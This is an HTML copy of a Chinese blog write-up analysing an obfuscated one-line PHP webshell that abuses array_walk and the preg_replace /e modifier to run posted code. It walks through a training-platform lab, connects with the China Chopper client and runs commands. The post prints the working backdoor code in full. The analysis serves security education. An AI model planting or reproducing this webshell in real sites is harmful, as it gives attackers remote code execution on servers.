@@ -1,0 +1,46 @@
+<html><head><meta charset='utf-8'><meta name='viewport' content='width=device-width, initial-scale=1'>
+<meta name='applicable-device' content='pc'><meta name='keywords' content='电脑,电脑讲解,电脑技术,编程,电脑故障维修WebShell代码分析溯源(九)' />
+<script src='../../highlight/highlight.pack.js'></script>
+<link rel='stylesheet' type='text/css' href='../../highlight/styles/monokai.css'/>
+
+<link rel='stylesheet' href='../../fenxiang/dist/css/share.min.css'>
+<script src='../../fenxiang/src/js/social-share.js'></script>
+<script src='../../fenxiang/src/js/qrcode.js'></script>
+
+</head><body><script>hljs.initHighlightingOnLoad();</script><script>
+var system ={};
+var p = navigator.platform;       
+system.win = p.indexOf('Win') == 0;  
+system.mac = p.indexOf('Mac') == 0;  
+system.x11 = (p == 'X11') || (p.indexOf('Linux') == 0);     
+if(system.win||system.mac||system.xll){
+document.write("<link href='../css/3.css' rel='stylesheet' type='text/css'>");}else{ document.write("<link href='../css/3wap.css' rel='stylesheet' type='text/css'>");}</script><script src='../../js/3.js'></script><div class='div2'><div class='heading_nav'><ul><div><li><a href='../../index.html'>首页</a></li>
+</div><div onclick='hidden1()' >分享</div>
+</ul></div></div>
+<div id='heading_nav2'> 
+<li class='row' >
+<div class='social-share' data-mode='prepend'><a href='javascript:' class='social-share-icon icon-heart'></a></div></li></div><script charset='utf-8' src='../../3/js/hengfu.js'></script><script charset='utf-8' src='../../3/js/hengfu2.js'></script><hr><div class='div1'><div class='biaoti'><center>WebShell代码分析溯源(九)</center></div><div class='banquan'>原文出处:本文由博客园博主雨中落叶提供。<br/>
+原文连接:https://www.cnblogs.com/yuzly/p/11751634.html</div><br>
+    <p><span style="font-size: 18pt; color: #ff0000;">WebShell代码分析溯源(九)</span></p>
+<p><span style="font-size: 18px;"><strong>一、一句话变形马样本</strong></span></p>
+<p><span style="font-size: 15px;">&lt;?php $e = $_REQUEST['e'];$arr = array($_POST['pass'] =&gt; '|.*|e',);array_walk($arr, $e, '');?&gt;</span></p>
+<p><strong><span style="font-size: 18px;">二、代码分析</span></strong></p>
+<p><span style="font-size: 15px;">1、调整代码格式</span></p>
+<p>　　<span style="font-size: 18px;"><img src="./images/WebShell代码分析溯源(九)0.jpg" alt="" /></span></p>
+<p><span style="font-size: 15px;">2、分析代码</span></p>
+<p><span style="font-size: 15px;">1、首先使用REQUEST方法接收url中的e参数的值,创建arr数组,然后array_walk对数组$arr中的每个元素应用用户自定义函数$e</span></p>
+<p><span style="font-size: 15px;">注:,array_walk() 函数对数组中的每个元素应用用户自定义函数。在函数中，数组的键名和键值是参数。</span></p>
+<p><span style="font-size: 15px;">参考: https://www.w3school.com.cn/php/func_array_walk.asp</span></p>
+<p><span style="font-size: 15px;">2、此时看到&rsquo;|.*|e&rsquo;,首先想到的是正则表达式,使用preg_replace()函数, preg_replace() 将 replacement 参数当作 PHP 代码，正则意思为匹配模式出现/e修正符，后面的replacement就会被当作php代码执行, 这样就可以把 $_POST['pass']构造运行,此时一句话木马就变成了&lt;?php preg_replace(&ldquo;|.*|e&rdquo;, $_POST['pass'],&rsquo;&rsquo;);?&gt;</span></p>
+<p><strong><span style="font-size: 18px;">三、漏洞环境搭建</span></strong></p>
+<p><span style="font-size: 15px;">1、这里使用在线学习平台墨者学院中的实验环境(WebShell代码分析溯源(第8题))，地址: <a href="https://www.mozhe.cn/bug/detail/ckhySG9DdFJPMlcrRndCZGlUMzMvUT09bW96aGUmozhe">https://www.mozhe.cn/bug/detail/ckhySG9DdFJPMlcrRndCZGlUMzMvUT09bW96aGUmozhe</a></span></p>
+<p><span style="font-size: 15px;">2、代码环境，下载代码</span></p>
+<p>　　<span style="font-size: 18px;"><img src="./images/WebShell代码分析溯源(九)1.jpg" alt="" /></span></p>
+<p><span style="font-size: 15px;">3、分析(上面已经分析过了)</span></p>
+<p><span style="font-size: 15px;">4、使用菜刀连接</span></p>
+<p>　　<span style="font-size: 18px;"><img src="./images/WebShell代码分析溯源(九)2.jpg" alt="" /></span></p>
+<p><span style="font-size: 15px;">5、执行一些命令</span></p>
+<p>　　<span style="font-size: 18px;"><img src="./images/WebShell代码分析溯源(九)3.jpg" alt="" /></span></p>
+<p>&nbsp;</p>
+
+</div></div><hr><script charset='utf-8' src='../../js/sming.js'></script></body></html>
